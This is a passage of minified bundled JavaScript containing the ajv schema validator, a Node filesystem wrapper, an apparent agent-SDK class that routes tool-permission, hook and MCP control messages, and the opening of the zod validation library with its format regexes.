meta-schema",definitions:{schemaArray:{type:"array",minItems:1,items:{$ref:"#"}},nonNegativeInteger:{type:"integer",minimum:0},nonNegativeIntegerDefault0:{allOf:[{$ref:"#/definitions/nonNegativeInteger"},{default:0}]},simpleTypes:{enum:["array","boolean","integer","null","number","object","string"]},stringArray:{type:"array",items:{type:"string"},uniqueItems:!0,default:[]}},type:["object","boolean"],properties:{$id:{type:"string",format:"uri-reference"},$schema:{type:"string",format:"uri"},$ref:{type:"string",format:"uri-reference"},$comment:{type:"string"},title:{type:"string"},description:{type:"string"},default:!0,readOnly:{type:"boolean",default:!1},examples:{type:"array",items:!0},multipleOf:{type:"number",exclusiveMinimum:0},maximum:{type:"number"},exclusiveMaximum:{type:"number"},minimum:{type:"number"},exclusiveMinimum:{type:"number"},maxLength:{$ref:"#/definitions/nonNegativeInteger"},minLength:{$ref:"#/definitions/nonNegativeIntegerDefault0"},pattern:{type:"string",format:"regex"},additionalItems:{$ref:"#"},items:{anyOf:[{$ref:"#"},{$ref:"#/definitions/schemaArray"}],default:!0},maxItems:{$ref:"#/definitions/nonNegativeInteger"},minItems:{$ref:"#/definitions/nonNegativeIntegerDefault0"},uniqueItems:{type:"boolean",default:!1},contains:{$ref:"#"},maxProperties:{$ref:"#/definitions/nonNegativeInteger"},minProperties:{$ref:"#/definitions/nonNegativeIntegerDefault0"},required:{$ref:"#/definitions/stringArray"},additionalProperties:{$ref:"#"},definitions:{type:"object",additionalProperties:{$ref:"#"},default:{}},properties:{type:"object",additionalProperties:{$ref:"#"},default:{}},patternProperties:{type:"object",additionalProperties:{$ref:"#"},propertyNames:{format:"regex"},default:{}},dependencies:{type:"object",additionalProperties:{anyOf:[{$ref:"#"},{$ref:"#/definitions/stringArray"}]}},propertyNames:{$ref:"#"},const:!0,enum:{type:"array",items:!0,minItems:1,uniqueItems:!0},type:{anyOf:[{$ref:"#/definitions/simpleTypes"},{type:"array",items:{$ref:"#/definitions/simpleTypes"},minItems:1,uniqueItems:!0}]},format:{type:"string"},contentMediaType:{type:"string"},contentEncoding:{type:"string"},if:{$ref:"#"},then:{$ref:"#"},else:{$ref:"#"},allOf:{$ref:"#/definitions/schemaArray"},anyOf:{$ref:"#/definitions/schemaArray"},oneOf:{$ref:"#/definitions/schemaArray"},not:{$ref:"#"}},default:!0}}),Lf1=Y0((X,J)=>{var Q=kN();J.exports={$id:"https://github.com/ajv-validator/ajv/blob/master/lib/definition_schema.js",definitions:{simpleTypes:Q.definitions.simpleTypes},type:"object",dependencies:{schema:["validate"],$data:["validate"],statements:["inline"],valid:{not:{required:["macro"]}}},properties:{type:Q.properties.type,schema:{type:"boolean"},statements:{type:"boolean"},dependencies:{type:"array",items:{type:"string"}},metaSchema:{type:"object"},modifying:{type:"boolean"},valid:{type:"boolean"},$data:{type:"boolean"},async:{type:"boolean"},errors:{anyOf:[{type:"boolean"},{const:"full"}]}}}}),Df1=Y0((X,J)=>{var Q=/^[a-z_$][a-z0-9_$-]*$/i,Y=Nf1(),W=Lf1();J.exports={add:z,get:G,remove:H,validate:U};function z(K,V){var B=this.RULES;if(B.keywords[K])throw new Error("Keyword "+K+" is already defined");if(!Q.test(K))throw new Error("Keyword "+K+" is not a valid identifier");if(V){this.validateKeyword(V,!0);var Z=V.type;if(Array.isArray(Z))for(var M=0;M<Z.length;M++)j(K,Z[M],V);else j(K,Z,V);var F=V.metaSchema;if(F){if(V.$data&&this._opts.$data)F={anyOf:[F,{$ref:"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}]};V.validateSchema=this.compile(F,!0)}}B.keywords[K]=B.all[K]=!0;function j(O,N,A){var D;for(var S=0;S<B.length;S++){var $=B[S];if($.type==N){D=$;break}}if(!D)D={type:N,rules:[]},B.push(D);var T={keyword:O,definition:A,custom:!0,code:Y,implements:A.implements};D.rules.push(T),B.custom[O]=T}return this}function G(K){var V=this.RULES.custom[K];return V?V.definition:this.RULES.keywords[K]||!1}function H(K){var V=this.RULES;delete V.keywords[K],delete V.all[K],delete V.custom[K];for(var B=0;B<V.length;B++){var Z=V[B].rules;for(var M=0;M<Z.length;M++)if(Z[M].keyword==K){Z.splice(M,1);break}}return this}function U(K,V){U.errors=null;var B=this._validateKeyword=this._validateKeyword||this.compile(W,!0);if(B(K))return!0;if(U.errors=B.errors,V)throw new Error("custom keyword definition is invalid: "+this.errorsText(B.errors));else return!1}}),wf1=Y0((X,J)=>{J.exports={$schema:"http://json-schema.org/draft-07/schema#",$id:"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#",description:"Meta-schema for $data reference (JSON Schema extension proposal)",type:"object",required:["$data"],properties:{$data:{type:"string",anyOf:[{format:"relative-json-pointer"},{format:"json-pointer"}]}},additionalProperties:!1}}),If1=Y0((X,J)=>{var Q=nx1(),Y=qH(),W=ax1(),z=_N(),G=EN(),H=sx1(),U=Of1(),K=Rf1(),V=w7();J.exports=O,O.prototype.validate=N,O.prototype.compile=A,O.prototype.addSchema=D,O.prototype.addMetaSchema=S,O.prototype.validateSchema=$,O.prototype.getSchema=k,O.prototype.removeSchema=a,O.prototype.addFormat=u,O.prototype.errorsText=Q1,O.prototype._addSchema=f,O.prototype._compile=m,O.prototype.compileAsync=Af1();var B=Df1();O.prototype.addKeyword=B.add,O.prototype.getKeyword=B.get,O.prototype.removeKeyword=B.remove,O.prototype.validateKeyword=B.validate;var Z=ZH();O.ValidationError=Z.Validation,O.MissingRefError=Z.MissingRef,O.$dataMetaSchema=K;var M="http://json-schema.org/draft-07/schema",F=["removeAdditional","useDefaults","coerceTypes","strictDefaults"],j=["/properties"];function O(g){if(!(this instanceof O))return new O(g);if(g=this._opts=V.copy(g)||{},b1(this),this._schemas={},this._refs={},this._fragments={},this._formats=H(g.format),this._cache=g.cache||new W,this._loadingSchemas={},this._compilations=[],this.RULES=U(),this._getId=o(g),g.loopRequired=g.loopRequired||1/0,g.errorDataPath=="property")g._errorDataPathProperty=!0;if(g.serialize===void 0)g.serialize=G;if(this._metaOpts=X0(this),g.formats)N1(this);if(g.keywords)i1(this);if(z1(this),typeof g.meta=="object")this.addMetaSchema(g.meta);if(g.nullable)this.addKeyword("nullable",{metaSchema:{type:"boolean"}});B1(this)}function N(g,X1){var V1;if(typeof g=="string"){if(V1=this.getSchema(g),!V1)throw new Error('no schema with key or ref "'+g+'"')}else{var n=this._addSchema(g);V1=n.validate||this._compile(n)}var r=V1(X1);if(V1.$async!==!0)this.errors=V1.errors;return r}function A(g,X1){var V1=this._addSchema(g,void 0,X1);return V1.validate||this._compile(V1)}function D(g,X1,V1,n){if(Array.isArray(g)){for(var r=0;r<g.length;r++)this.addSchema(g[r],void 0,V1,n);return this}var G1=this._getId(g);if(G1!==void 0&&typeof G1!="string")throw new Error("schema id must be string");return X1=Y.normalizeId(X1||G1),d1(this,X1),this._schemas[X1]=this._addSchema(g,V1,n,!0),this}function S(g,X1,V1){return this.addSchema(g,X1,V1,!0),this}function $(g,X1){var V1=g.$schema;if(V1!==void 0&&typeof V1!="string")throw new Error("$schema must be a string");if(V1=V1||this._opts.defaultMeta||T(this),!V1)return this.logger.warn("meta-schema not available"),this.errors=null,!0;var n=this.validate(V1,g);if(!n&&X1){var r="schema is invalid: "+this.errorsText();if(this._opts.validateSchema=="log")this.logger.error(r);else throw new Error(r)}return n}function T(g){var X1=g._opts.meta;return g._opts.defaultMeta=typeof X1=="object"?g._getId(X1)||X1:g.getSchema(M)?M:void 0,g._opts.defaultMeta}function k(g){var X1=y(this,g);switch(typeof X1){case"object":return X1.validate||this._compile(X1);case"string":return this.getSchema(X1);case"undefined":return E(this,g)}}function E(g,X1){var V1=Y.schema.call(g,{schema:{}},X1);if(V1){var{schema:n,root:r,baseId:G1}=V1,$1=Q.call(g,n,r,void 0,G1);return g._fragments[X1]=new z({ref:X1,fragment:!0,schema:n,root:r,baseId:G1,validate:$1}),$1}}function y(g,X1){return X1=Y.normalizeId(X1),g._schemas[X1]||g._refs[X1]||g._fragments[X1]}function a(g){if(g instanceof RegExp)return p(this,this._schemas,g),p(this,this._refs,g),this;switch(typeof g){case"undefined":return p(this,this._schemas),p(this,this._refs),this._cache.clear(),this;case"string":var X1=y(this,g);if(X1)this._cache.del(X1.cacheKey);return delete this._schemas[g],delete this._refs[g],this;case"object":var V1=this._opts.serialize,n=V1?V1(g):g;this._cache.del(n);var r=this._getId(g);if(r)r=Y.normalizeId(r),delete this._schemas[r],delete this._refs[r]}return this}function p(g,X1,V1){for(var n in X1){var r=X1[n];if(!r.meta&&(!V1||V1.test(n)))g._cache.del(r.cacheKey),delete X1[n]}}function f(g,X1,V1,n){if(typeof g!="object"&&typeof g!="boolean")throw new Error("schema should be object or boolean");var r=this._opts.serialize,G1=r?r(g):g,$1=this._cache.get(G1);if($1)return $1;n=n||this._opts.addUsedSchema!==!1;var m1=Y.normalizeId(this._getId(g));if(m1&&n)d1(this,m1);var t=this._opts.validateSchema!==!1&&!X1,Y1;if(t&&!(Y1=m1&&m1==Y.normalizeId(g.$schema)))this.validateSchema(g,!0);var Z1=Y.ids.call(this,g),M1=new z({id:m1,schema:g,localRefs:Z1,cacheKey:G1,meta:V1});if(m1[0]!="#"&&n)this._refs[m1]=M1;if(this._cache.put(G1,M1),t&&Y1)this.validateSchema(g,!0);return M1}function m(g,X1){if(g.compiling){if(g.validate=r,r.schema=g.schema,r.errors=null,r.root=X1?X1:r,g.schema.$async===!0)r.$async=!0;return r}g.compiling=!0;var V1;if(g.meta)V1=this._opts,this._opts=this._metaOpts;var n;try{n=Q.call(this,g.schema,X1,g.localRefs)}catch(G1){throw delete g.validate,G1}finally{if(g.compiling=!1,g.meta)this._opts=V1}return g.validate=n,g.refs=n.refs,g.refVal=n.refVal,g.root=n.root,n;function r(){var G1=g.validate,$1=G1.apply(this,arguments);return r.errors=G1.errors,$1}}function o(g){switch(g.schemaId){case"auto":return d;case"id":return J1;default:return H1}}function J1(g){if(g.$id)this.logger.warn("schema $id ignored",g.$id);return g.id}function H1(g){if(g.id)this.logger.warn("schema id ignored",g.id);return g.$id}function d(g){if(g.$id&&g.id&&g.$id!=g.id)throw new Error("schema $id is different from id");return g.$id||g.id}function Q1(g,X1){if(g=g||this.errors,!g)return"No errors";X1=X1||{};var V1=X1.separator===void 0?", ":X1.separator,n=X1.dataVar===void 0?"data":X1.dataVar,r="";for(var G1=0;G1<g.length;G1++){var $1=g[G1];if($1)r+=n+$1.dataPath+" "+$1.message+V1}return r.slice(0,-V1.length)}function u(g,X1){if(typeof X1=="string")X1=new RegExp(X1);return this._formats[g]=X1,this}function z1(g){var X1;if(g._opts.$data)X1=wf1(),g.addMetaSchema(X1,X1.$id,!0);if(g._opts.meta===!1)return;var V1=kN();if(g._opts.$data)V1=K(V1,j);g.addMetaSchema(V1,M,!0),g._refs["http://json-schema.org/schema"]=M}function B1(g){var X1=g._opts.schemas;if(!X1)return;if(Array.isArray(X1))g.addSchema(X1);else for(var V1 in X1)g.addSchema(X1[V1],V1)}function N1(g){for(var X1 in g._opts.formats){var V1=g._opts.formats[X1];g.addFormat(X1,V1)}}function i1(g){for(var X1 in g._opts.keywords){var V1=g._opts.keywords[X1];g.addKeyword(X1,V1)}}function d1(g,X1){if(g._schemas[X1]||g._refs[X1])throw new Error('schema with key or id "'+X1+'" already exists')}function X0(g){var X1=V.copy(g._opts);for(var V1=0;V1<F.length;V1++)delete X1[F[V1]];return X1}function b1(g){var X1=g._opts.logger;if(X1===!1)g.logger={log:S1,warn:S1,error:S1};else{if(X1===void 0)X1=console;if(!(typeof X1=="object"&&X1.log&&X1.warn&&X1.error))throw new Error("logger must implement log, warn and error methods");g.logger=X1}}function S1(){}});$f1={accessSync(X,J){s1.accessSync(X,J)},cwd(){return process.cwd()},chmodSync(X,J){s1.chmodSync(X,J)},existsSync(X){return s1.existsSync(X)},async stat(X){return Ef1(X)},statSync(X){return s1.statSync(X)},readFileSync(X,J){return s1.readFileSync(X,{encoding:J.encoding})},readFileBytesSync(X){return s1.readFileSync(X)},readSync(X,J){let Q=void 0;try{Q=s1.openSync(X,"r");let Y=Buffer.alloc(J.length),W=s1.readSync(Q,Y,0,J.length,0);return{buffer:Y,bytesRead:W}}finally{if(Q)s1.closeSync(Q)}},writeFileSync(X,J,Q){if(!Q.flush){s1.writeFileSync(X,J,{encoding:Q.encoding});return}let Y;try{Y=s1.openSync(X,"w"),s1.writeFileSync(Y,J,{encoding:Q.encoding}),s1.fsyncSync(Y)}finally{if(Y)s1.closeSync(Y)}},appendFileSync(X,J){s1.appendFileSync(X,J)},copyFileSync(X,J){s1.copyFileSync(X,J)},unlinkSync(X){s1.unlinkSync(X)},renameSync(X,J){s1.renameSync(X,J)},symlinkSync(X,J){s1.symlinkSync(X,J)},readlinkSync(X){return s1.readlinkSync(X)},realpathSync(X){return s1.realpathSync(X)},mkdirSync(X){if(!s1.existsSync(X))s1.mkdirSync(X,{recursive:!0})},readdirSync(X){return s1.readdirSync(X,{withFileTypes:!0})},readdirStringSync(X){return s1.readdirSync(X)},isDirEmptySync(X){return this.readdirSync(X).length===0},rmdirSync(X){s1.rmdirSync(X)},rmSync(X,J){s1.rmSync(X,J)},createWriteStream(X){return s1.createWriteStream(X)}},kf1=$f1;U7=class U7 extends Error{};fN=class fN{returned;queue=[];readResolve;readReject;isDone=!1;hasError;started=!1;constructor(X){this.returned=X}[Symbol.asyncIterator](){if(this.started)throw new Error("Stream can only be iterated once");return this.started=!0,this}next(){if(this.queue.length>0)return Promise.resolve({done:!1,value:this.queue.shift()});if(this.isDone)return Promise.resolve({done:!0,value:void 0});if(this.hasError)return Promise.reject(this.hasError);return new Promise((X,J)=>{this.readResolve=X,this.readReject=J})}enqueue(X){if(this.readResolve){let J=this.readResolve;this.readResolve=void 0,this.readReject=void 0,J({done:!1,value:X})}else this.queue.push(X)}done(){if(this.isDone=!0,this.readResolve){let X=this.readResolve;this.readResolve=void 0,this.readReject=void 0,X({done:!0,value:void 0})}}error(X){if(this.hasError=X,this.readReject){let J=this.readReject;this.readResolve=void 0,this.readReject=void 0,J(X)}}return(){if(this.isDone=!0,this.returned)this.returned();return Promise.resolve({done:!0,value:void 0})}};hN=class hN{transport;isStreamingMode;canUseTool;hooks;abortController;pendingControlResponses=new Map;cleanupPerformed=!1;sdkMessages;inputStream=new fN;initialization;cancelControllers=new Map;hookCallbacks=new Map;nextCallbackId=0;sdkMcpTransports=new Map;pendingMcpResponses=new Map;constructor(X,J,Q,Y,W,z=new Map){this.transport=X,this.isStreamingMode=J,this.canUseTool=Q,this.hooks=Y,this.abortController=W;for(let[G,H]of z){let U=new gN((K)=>this.sendMcpServerMessageToCli(G,K));this.sdkMcpTransports.set(G,U),H.connect(U)}if(this.sdkMessages=this.readSdkMessages(),this.readMessages(),this.isStreamingMode)this.initialization=this.initialize()}setError(X){this.inputStream.error(X)}cleanup(X){if(this.cleanupPerformed)return;this.cleanupPerformed=!0;try{if(this.transport.close(),this.pendingControlResponses.clear(),this.pendingMcpResponses.clear(),X)this.inputStream.error(X);else this.inputStream.done()}catch(J){}}next(...[X]){return this.sdkMessages.next(...[X])}return(X){return this.sdkMessages.return(X)}throw(X){return this.sdkMessages.throw(X)}[Symbol.asyncIterator](){return this.sdkMessages}[Symbol.asyncDispose](){return this.sdkMessages[Symbol.asyncDispose]()}async readMessages(){try{for await(let X of this.transport.readMessages()){if(X.type==="control_response"){let J=this.pendingControlResponses.get(X.response.request_id);if(J)J(X.response);continue}else if(X.type==="control_request"){this.handleControlRequest(X);continue}else if(X.type==="control_cancel_request"){this.handleControlCancelRequest(X);continue}this.inputStream.enqueue(X)}this.inputStream.done(),this.cleanup()}catch(X){this.inputStream.error(X),this.cleanup(X)}}async handleControlRequest(X){let J=new AbortController;this.cancelControllers.set(X.request_id,J);try{let Q=await this.processControlRequest(X,J.signal),Y={type:"control_response",response:{subtype:"success",request_id:X.request_id,response:Q}};await Promise.resolve(this.transport.write(JSON.stringify(Y)+`
`))}catch(Q){let Y={type:"control_response",response:{subtype:"error",request_id:X.request_id,error:Q.message||String(Q)}};await Promise.resolve(this.transport.write(JSON.stringify(Y)+`
`))}finally{this.cancelControllers.delete(X.request_id)}}handleControlCancelRequest(X){let J=this.cancelControllers.get(X.request_id);if(J)J.abort(),this.cancelControllers.delete(X.request_id)}async processControlRequest(X,J){if(X.request.subtype==="can_use_tool"){if(!this.canUseTool)throw new Error("canUseTool callback is not provided.");return this.canUseTool(X.request.tool_name,X.request.input,{signal:J,suggestions:X.request.permission_suggestions})}else if(X.request.subtype==="hook_callback")return await this.handleHookCallbacks(X.request.callback_id,X.request.input,X.request.tool_use_id,J);else if(X.request.subtype==="mcp_message"){let Q=X.request,Y=this.sdkMcpTransports.get(Q.server_name);if(!Y)throw new Error(`SDK MCP server not found: ${Q.server_name}`);if("method"in Q.message&&"id"in Q.message&&Q.message.id!==null)return{mcp_response:await this.handleMcpControlRequest(Q.server_name,Q,Y)};else{if(Y.onmessage)Y.onmessage(Q.message);return{mcp_response:{jsonrpc:"2.0",result:{},id:0}}}}throw new Error("Unsupported control request subtype: "+X.request.subtype)}async*readSdkMessages(){for await(let X of this.inputStream)yield X}async initialize(){let X;if(this.hooks){X={};for(let[Y,W]of Object.entries(this.hooks))if(W.length>0)X[Y]=W.map((z)=>{let G=[];for(let H of z.hooks){let U=`hook_${this.nextCallbackId++}`;this.hookCallbacks.set(U,H),G.push(U)}return{matcher:z.matcher,hookCallbackIds:G}})}let J={subtype:"initialize",hooks:X};return(await this.request(J)).response}async interrupt(){await this.request({subtype:"interrupt"})}async setPermissionMode(X){await this.request({subtype:"set_permission_mode",mode:X})}async setModel(X){await this.request({subtype:"set_model",model:X})}request(X){if(!this.isStreamingMode)throw new Error(`${X.subtype} requires --input-format stream-json`);let J=Math.random().toString(36).substring(2,15),Q={request_id:J,type:"control_request",request:X};return new Promise((Y,W)=>{this.pendingControlResponses.set(J,(z)=>{if(z.subtype==="success")Y(z);else W(new Error(z.error))}),Promise.resolve(this.transport.write(JSON.stringify(Q)+`
`))})}async supportedCommands(){if(!this.isStreamingMode||!this.initialization)throw new Error("supportedCommands is only supported in streaming mode");return(await this.initialization).commands}async supportedModels(){if(!this.isStreamingMode||!this.initialization)throw new Error("supportedModels is only supported in streaming mode");return(await this.initialization).models}async streamInput(X){try{for await(let J of X){if(this.abortController?.signal.aborted)break;await Promise.resolve(this.transport.write(JSON.stringify(J)+`
`))}this.transport.endInput()}catch(J){if(!(J instanceof U7))throw J}}handleHookCallbacks(X,J,Q,Y){let W=this.hookCallbacks.get(X);if(!W)throw new Error(`No hook callback found for ID: ${X}`);return W(J,Q,{signal:Y})}sendMcpServerMessageToCli(X,J){if("id"in J&&J.id!==null&&J.id!==void 0){let Q=`${X}:${J.id}`,Y=this.pendingMcpResponses.get(Q);if(Y){Y.resolve(J),this.pendingMcpResponses.delete(Q);return}}throw new Error("No pending request found")}handleMcpControlRequest(X,J,Q){let Y="id"in J.message?J.message.id:null,W=`${X}:${Y}`;return new Promise((z,G)=>{let H=null,U=()=>{if(H)clearTimeout(H);this.pendingMcpResponses.delete(W)},K=(B)=>{U(),z(B)},V=(B)=>{U(),G(B)};if(this.pendingMcpResponses.set(W,{resolve:K,reject:V}),Q.onmessage)Q.onmessage(J.message);else{U(),G(new Error("No message handler registered"));return}H=setTimeout(()=>{if(this.pendingMcpResponses.has(W))U(),G(new Error("Request timeout"))},30000)})}};L={};px1(L,{void:()=>Og1,util:()=>N0,unknown:()=>Fg1,union:()=>Lg1,undefined:()=>qg1,tuple:()=>Ig1,transformer:()=>LN,symbol:()=>Bg1,string:()=>dN,strictObject:()=>Ng1,setErrorMap:()=>ff1,set:()=>Sg1,record:()=>Cg1,quotelessJson:()=>vf1,promise:()=>bg1,preprocess:()=>fg1,pipeline:()=>gg1,ostring:()=>hg1,optional:()=>vg1,onumber:()=>yg1,oboolean:()=>mg1,objectUtil:()=>tz,object:()=>Ag1,number:()=>iN,nullable:()=>xg1,null:()=>Zg1,never:()=>jg1,nativeEnum:()=>kg1,nan:()=>Ug1,map:()=>Pg1,makeIssue:()=>Z2,literal:()=>Eg1,lazy:()=>_g1,late:()=>zg1,isValid:()=>rX,isDirty:()=>XH,isAsync:()=>YQ,isAborted:()=>ez,intersection:()=>wg1,instanceof:()=>Hg1,getParsedType:()=>T6,getErrorMap:()=>q2,function:()=>Tg1,enum:()=>$g1,effect:()=>LN,discriminatedUnion:()=>Dg1,defaultErrorMap:()=>B7,datetimeRegex:()=>cN,date:()=>Vg1,custom:()=>pN,coerce:()=>ug1,boolean:()=>rN,bigint:()=>Kg1,array:()=>Rg1,any:()=>Mg1,addIssueToContext:()=>P1,ZodVoid:()=>GQ,ZodUnknown:()=>WX,ZodUnion:()=>F7,ZodUndefined:()=>Z7,ZodType:()=>H0,ZodTuple:()=>Q6,ZodTransformer:()=>K8,ZodSymbol:()=>WQ,ZodString:()=>k8,ZodSet:()=>sX,ZodSchema:()=>H0,ZodRecord:()=>zQ,ZodReadonly:()=>D7,ZodPromise:()=>oX,ZodPipeline:()=>KQ,ZodParsedType:()=>T1,ZodOptional:()=>U8,ZodObject:()=>p0,ZodNumber:()=>GX,ZodNullable:()=>_6,ZodNull:()=>M7,ZodNever:()=>J6,ZodNativeEnum:()=>A7,ZodNaN:()=>UQ,ZodMap:()=>HQ,ZodLiteral:()=>R7,ZodLazy:()=>O7,ZodIssueCode:()=>F1,ZodIntersection:()=>j7,ZodFunction:()=>V7,ZodFirstPartyTypeKind:()=>R1,ZodError:()=>s9,ZodEnum:()=>HX,ZodEffects:()=>K8,ZodDiscriminatedUnion:()=>j2,ZodDefault:()=>N7,ZodDate:()=>nX,ZodCatch:()=>L7,ZodBranded:()=>O2,ZodBoolean:()=>q7,ZodBigInt:()=>zX,ZodArray:()=>b8,ZodAny:()=>aX,Schema:()=>H0,ParseStatus:()=>A9,OK:()=>$9,NEVER:()=>cg1,INVALID:()=>a1,EMPTY_PATH:()=>gf1,DIRTY:()=>K7,BRAND:()=>Gg1});(function(X){X.assertEqual=(W)=>{};function J(W){}X.assertIs=J;function Q(W){throw new Error}X.assertNever=Q,X.arrayToEnum=(W)=>{let z={};for(let G of W)z[G]=G;return z},X.getValidEnumValues=(W)=>{let z=X.objectKeys(W).filter((H)=>typeof W[W[H]]!=="number"),G={};for(let H of z)G[H]=W[H];return X.objectValues(G)},X.objectValues=(W)=>{return X.objectKeys(W).map(function(z){return W[z]})},X.objectKeys=typeof Object.keys==="function"?(W)=>Object.keys(W):(W)=>{let z=[];for(let G in W)if(Object.prototype.hasOwnProperty.call(W,G))z.push(G);return z},X.find=(W,z)=>{for(let G of W)if(z(G))return G;return},X.isInteger=typeof Number.isInteger==="function"?(W)=>Number.isInteger(W):(W)=>typeof W==="number"&&Number.isFinite(W)&&Math.floor(W)===W;function Y(W,z=" | "){return W.map((G)=>typeof G==="string"?`'${G}'`:G).join(z)}X.joinValues=Y,X.jsonStringifyReplacer=(W,z)=>{if(typeof z==="bigint")return z.toString();return z}})(N0||(N0={}));(function(X){X.mergeShapes=(J,Q)=>{return{...J,...Q}}})(tz||(tz={}));T1=N0.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),F1=N0.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]);s9=class s9 extends Error{get errors(){return this.issues}constructor(X){super();this.issues=[],this.addIssue=(Q)=>{this.issues=[...this.issues,Q]},this.addIssues=(Q=[])=>{this.issues=[...this.issues,...Q]};let J=new.target.prototype;if(Object.setPrototypeOf)Object.setPrototypeOf(this,J);else this.__proto__=J;this.name="ZodError",this.issues=X}format(X){let J=X||function(W){return W.message},Q={_errors:[]},Y=(W)=>{for(let z of W.issues)if(z.code==="invalid_union")z.unionErrors.map(Y);else if(z.code==="invalid_return_type")Y(z.returnTypeError);else if(z.code==="invalid_arguments")Y(z.argumentsError);else if(z.path.length===0)Q._errors.push(J(z));else{let G=Q,H=0;while(H<z.path.length){let U=z.path[H];if(H!==z.path.length-1)G[U]=G[U]||{_errors:[]};else G[U]=G[U]||{_errors:[]},G[U]._errors.push(J(z));G=G[U],H++}}};return Y(this),Q}static assert(X){if(!(X instanceof s9))throw new Error(`Not a ZodError: ${X}`)}toString(){return this.message}get message(){return JSON.stringify(this.issues,N0.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(X=(J)=>J.message){let J={},Q=[];for(let Y of this.issues)if(Y.path.length>0){let W=Y.path[0];J[W]=J[W]||[],J[W].push(X(Y))}else Q.push(X(Y));return{formErrors:Q,fieldErrors:J}}get formErrors(){return this.flatten()}};s9.create=(X)=>{return new s9(X)};B7=xf1,yN=B7;gf1=[];a1=Object.freeze({status:"aborted"});(function(X){X.errToObj=(J)=>typeof J==="string"?{message:J}:J||{},X.toString=(J)=>typeof J==="string"?J:J?.message})(h1||(h1={}));hf1=/^c[^\s-]{8,}$/i,yf1=/^[0-9a-z]+$/,mf1=/^[0-9A-HJKMNP-TV-Z]{26}$/i,uf1=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,cf1=/^[a-z0-9_-]{21}$/i,lf1=/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/,pf1=/^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/,df1=/^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,rf1=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,nf1=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/(3[0-2]|[12]?[0-9])$/,af1=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/,sf1=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/,of1=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,tf1=/^([0-9a-zA-Z-_]{4})*(([0-9a-zA-Z-_]{2}(==)?)|([0-9a-zA-Z-_]{3}(=)?))?$/,ef1=new RegExp(`^${mN}$`);k8=class k8 extends 